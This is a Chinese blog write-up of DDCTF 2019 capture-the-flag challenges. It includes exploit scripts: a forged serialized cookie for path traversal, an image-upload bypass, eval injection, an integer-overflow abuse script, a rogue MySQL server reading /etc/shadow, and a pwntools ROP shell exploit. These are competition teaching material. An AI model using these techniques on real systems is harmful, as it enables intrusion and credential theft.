---
title: DDCTF2019 Writeup
date: 2019-04-25 00:17:49
tags: [writeup, ddctf]
---

历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了...  
部分题目质量还是不错的 \_(:з」∠)\_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃  

<!-- more -->

# Web

## 滴~
`http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09` 中 `TmpZMlF6WXhOamN5UlRaQk56QTJOdz09`  
可以看出来是双层 base64 + 一层 base16, 解码得到 flag.jpg, 那么可以得到 index.php 就是 `TmprMlJUWTBOalUzT0RKRk56QTJPRGN3`,  
就可以直接读源码了, 然而并没有 flag, 也不能读 config.php,  
跟着注释中的网址 `https://blog.csdn.net/FengBanLiuYun/article/details/80616607` 可以在同作者底下找到 vim 学习记录, 找到 `.practice.txt.swp` 但是直接访问 404...,  
各种姿势尝试发现是 `practice.txt.swp`... 有毒, 得到 `f1ag!ddctf.php` 的提示, 用 `f1agconfigddctf.php` 绕过, 得到源码,  
用 `f1ag!ddctf.php?k=data:,123&uid=123` 即可绕过, 得到 flag.

## WEB 签到题
在 `/js/index.js` 找到验证逻辑, 通过 `didictf_username` 的 `header` 来验证, 随便试了个 `admin` 就通过了,  
得到下一步地址 `/app/fL2XID2i0Cdh.php`,  
```php
if(!empty($_POST["nickname"])) {
    $arr = array($_POST["nickname"],$this->eancrykey);
    $data = "Welcome my friend %s";
    foreach ($arr as $k => $v) {
        $data = sprintf($data,$v);
    }
    parent::response($data,"Welcome");
}
```
让 nickname 为 %s 就可以拿到 key, 通过双写绕过替换. 然后构造 Cookie 反序列化就可以了, 脚本如下  
```php
<?php
Class Application {
// ... 省略
}

$a = new Application();
$a->path = "..././config/flag.txt";
$s = serialize($a);
$key = "EzblrbNS";
$s .= md5($key . $s);
echo $s; // O:11:"Application":1:{s:4:"path";s:21:"..././config/flag.txt";}5a014dbe49334e6dbb7326046950bee2
```
把 `ddctf_id` 的值改成这个访问下就拿到 flag 了.

## Upload-IMG
目的很明确, 图片里面存在 `phpinfo()` 就给 flag随便传个图片, 下载下来发现有 `CREATOR: gd-jpeg`,  
应该是在服务器端有二次处理, 不能通过 exif 啥的携带数据, 用 GIMP 创建一张 20x20 图片, 在本地测试了一下  
```php
<?php
$img = imagecreatefromjpeg('/home/rmb122/gd.jpg');
imagejpeg($img, '/home/rmb122/gd-out.jpg', 80);
```
010editor 可以解析格式, fuzz 发现在 ScanData 第三个字节后面写 phpinfo() 不会被处理掉, 传上去就拿到 flag 了.  

## homebrew event loop
审计源码, 发现  
```python
is_action = event[0] == 'a' 
action = get_mid_str(event, ':', ';') 
args = get_mid_str(event, action+';').split('#') 
try: 
    event_handler = eval(action + ('_handler' if is_action else '_function')) 
    ret_val = event_handler(args) 
except RollBackException:
```
取 event_handler 的时候没有过滤, 通过 `?action:funcname%23;...`  
也就是在名字后面加个 `#` 可以绕过必须有后缀的限制, 于是就可以构造  
`?action:trigger_event%23;action:buy;1000%23action:get_flag;1`  
就可以调用 `get_flag_handler` 了, 虽然不能直接得到 flag, 而且交易会回滚, 但是因为  
```python
def trigger_event(event): 
    session['log'].append(event) 
    if len(session['log']) > 5: session['log'] = session['log'][-5:] 
    if type(event) == type([]): 
```
有 log 的原因, 而且会存在 session 里面, 而 flask 的 session 内的数据是存在 cookie 里面的,  
通过 [session_cookie_manager](https://github.com/noraj/flask-session-cookie-manager) 直接就可以解码, 得到在 log 里面的 flag.

## 大吉大利,今晚吃鸡~
通过浏览器插件 `wappalyzer` (应该是分析 Cookie 名称 `revel_session` 获取的) 可以得到后端是 go 写的,  
盲猜有整数溢出, 最后试出来 `2 ** 32` 也就是 `4294967296` 可以溢出买到票, 里面比较迷,  
还以为得什么洞拿到机器人的 token, 结果我自己又注册了个号, 发现可以直接自己移除自己...  
然后写脚本不停自己移除自己就行了, 然后后端分配 id 还是在一个范围内随机的, 不是每次都是新 id, 而且访问速度还有限制  
后面才能好久移除一个 233, 总之跑了好久移除完访问 `/index.html#/main/result` 直接拿到 flag.

```python
import requests
import random
import time

act = 'rmb122'
pwd = 'rmb122sudo ufw status numbered'
mainSess = requests.session()
mainSess.get(f'http://117.51.147.155:5050/ctf/api/login?name={act}&password={pwd}')


for i in range(1,999):
    tmpact = 'laioqoLKJHSLJDKHKJrmb122' + 'QAQ' + str(i)
    tmppwd = 'zxczxczxczxcczx'
    tmp = requests.session()
    tmp.get(f'http://117.51.147.155:5050/ctf/api/register?name={tmpact}&password={tmppwd}')
    tmp.get('http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296')
    bill = tmp.get('http://117.51.147.155:5050/ctf/api/search_bill_info').json()['data'][0]['bill_id']
    tmp.get(f'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={bill}')
    res = tmp.get('http://117.51.147.155:5050/ctf/api/search_ticket').json()
    id = res['data'][0]['id']
    token = res['data'][0]['ticket']
    res = mainSess.get(f'http://117.51.147.155:5050/ctf/api/remove_robot?id={id}&ticket={token}').json()
    print(res)
    time.sleep(3)
```

## mysql弱口令
既然是客户端连服务端, 可以想到是 mysql 客户端的文件读取漏洞, 有现成的[项目](https://github.com/allyshka/Rogue-MySql-Server)  
然后一开始没发现 `agent.py` 里面是用的 `netstat`, 我用普通用户权限跑过不了检测 233, 就先去做上面一题了,  
之后看了下源码用 `root` 跑就没问题了, 成功读 `/etc/passwd`, 接下来直接尝试读 `/etc/shadow`, 竟然读的了, 应该是 root 权限跑的 bot,  
然后读 `/root/.bash_history` 可以得到 bot 源码路径, 发现提示 `# flag in mysql  curl@localhost database:security  table:flag`,  
那么直接读数据库文件就可以了, `/var/lib/mysql/security/flag.ibd`, 拿到 flag.


# Reverse

## Windows Reverse1
`upx -d` 直接脱壳, 但是不知道为什么跑不了 233, 最后还是用的 `ida` 动态调试原程序, 发现就是对输入的字符替换一下, 写个脚本就行  
```python
sbox = '''~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)(\x27&%$#"! '''
shift = 32
revSbox = {}
flag = "DDCTF{reverseME}"
for seq, i in enumerate(sbox):
    revSbox[i] = chr(32 + seq)
for i in flag:
    print(revSbox[i], end='')
```

## Windows Reverse2
用了没听说过的壳, 于是就手动找 OEP 脱了, 然而也跑不了, 只能 F5 233, 不过这也足够了, 发现第一层  
就是 hex2bin, 然后第二层用了 std::string, 看不出来是啥, 动态调发现其实就是个 base64encode, 结果是 `reverse+` 就通过  
那么同样一个脚本搞定  
```python
import base64

flag = 'reverse+'
flag = base64.b64decode(flag)
flag = base64.b16encode(flag)
print(flag)
```

# MISC

## 真-签到题
公告最底下就是啦

## 北京地铁
不得不说这题脑洞是真的大... `Stegsolve.jar` 可以直接提取出隐写的东西, 但是不知道有啥用...  
最后提示三放出来以后, 谷歌搜图搜到原图, 发现把二号线的颜色给换了, `号` 和 `线` 字周围的颜色不一致就是没 PS 好,  
233, 然后找了半天差别, 发现 `魏公村` 的颜色跟别的站点不一样, 随便试了一下拼音发现竟然就是秘钥, 惊了...  
爆破了半天没出来, 没想到秘钥居然是这个.  
```python
import base64
from Crypto.Cipher import AES
from string import ascii_lowercase
from itertools import product

def padding(key):
    return key + b'\x00' * (16 - len(key) % 16)

# for i in product(*([ascii_lowercase] * count)):
# for count in range(1, 17):
i = 'weigongcun'
c = "iKk/Ju3vu4wOnssdIaUSrg=="
c = base64.b64decode(c)
a = AES.new(padding(i.encode()), AES.MODE_ECB)
res = a.decrypt(c)
if res[:2] == b"DDCTF":
        print(i)
print(res)
```

## MulTzor
感觉是 xor, 随手丢到之前看[老外](https://ctftime.org/writeup/3656)做题发现的[工具](https://github.com/nccgroup/featherduster),  
autopwn 一下直接就出 flag 了, 不得不说太强了. 
```
[+] Running multi-byte XOR brute force attack...

Best candidate decryptions for M�fjc�ab~Z[�2e...:
----------------------------------------

Trying keysize 24
Processing chunk 24 of 78
Trying keysize 18
Processing chunk 42 of 78
Trying keysize 36
Processing chunk 78 of 78

....省略

The flag is: DDCTF{07b1b46d1db28843d1fd76889fea9b36}
```

## [PWN] strike
read 不会在读取的数据后面加 \x00, 于是就可以通过 fprintf 泄露 setbuf 地址,  
然后算出基地址. password 长度输 -1, 就可以绕过长度限制, 直接栈溢出, 之后就是 rop 了.  

```python
from pwn import *

p = remote('116.85.48.105',5005)
p.recvuntil('username:')
p.send('1'* 40)

t = p.recvuntil('Plea')
libcleak = u32(t[0x33:0x37])  
stackButtom =  u32(t[0x2f:0x33])
stack = stackButtom + 0x18
libcbase = libcleak - 0x00065465
# print hex(stack)
# print hex(libcbase)

p.recvuntil('password:')
p.sendline('-1')
p.recvuntil('):')
binsh = libcbase + 0x0015902B
# execve = libcbase + 0x000AF590
system = libcbase + 0x0003A940
payload = p32(stack)*((0x4c+0x18)/4 - 1) + p32(system) + p32(binsh) *4
p.send(payload)
p.interactive()
```

## Wireshark
找 HTTP 流量, 可以找到几张图, 有一张图损坏无法打开, 发现 crc 不对, 修复一下就是秘钥,  
得到 `57pmYyWt`, 然而不知道是啥隐写, 最后通过流量记录发现访问过 `http://tools.jb51.net/`,  
可以在上面找到一个图片隐写, 把图片都试了一下最后发现那张比较大的图片可以解出 flag,  
```
flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-
```
把里面的 `44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D`, 解个 hex 就拿到 flag.  

## 联盟决策大会
Shamir 秘密分享方案, 密码学刚学, 在 [wiki](https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing) 上有个挺好的脚本,  
题目相当于用两次 Shamir, 这样就可以让两个组织都到才能解密, 把脚本照着这个思路稍微改一下就能拿到 flag,  
```python
from __future__ import division
from __future__ import print_function

import random
import functools

# 12th Mersenne Prime
# (for this application we want a known prime number as close as
# possible to our security level; e.g.  desired security level of 128
# bits -- too large and all the ciphertext is large; too small and
# security is compromised)
_PRIME = 0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7
# 13th Mersenne Prime is 2**521 - 1

# ... 省略

t1 = (1,0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A)
t2 = (2,0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7)
t3 = (4,0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC)
t4 = (3,0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA)
t5 = (4,0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9)
t6 = (5,0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45)

def main():
    '''main function'''
    shares = [t1,t2,t3]
    shares2 = [t4,t5,t6]
    a = recover_secret(shares)
    b = recover_secret(shares2)
    t7 = (1, a)
    t8 = (2, b)
    c = recover_secret([t7, t8])
    c = hex(c)[2:]
    print(c)
    print(bytes.fromhex(c))
    #shares = []
    #a = recover_secret(shares)
    #print(a)
```